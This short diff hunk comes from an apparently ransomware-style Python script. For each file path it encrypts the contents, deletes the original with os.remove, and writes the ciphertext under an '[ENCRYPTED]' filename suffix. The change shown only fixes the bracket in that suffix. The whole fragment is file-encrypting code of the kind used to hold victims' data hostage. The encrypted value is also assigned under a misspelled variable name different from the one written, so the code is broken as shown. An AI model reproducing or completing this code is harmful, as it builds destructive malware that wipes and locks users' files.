@@ -53,7 +53,7 @@ for file_path in files_path:
 			crypetd_texted_file = f.encrypt(texted_file)
 		print(file_path , 'CRYPTED'.center(10,'_'))
 		os.remove(file_path)
-		with open(file_path+'[ENCRYPTED'.center(20,'__') , 'w') as crypted_file:
+		with open(file_path+'[ENCRYPTED]'.center(20,'__') , 'w') as crypted_file:
 			crypted_file.write(crypted_texted_file)
 			
 			
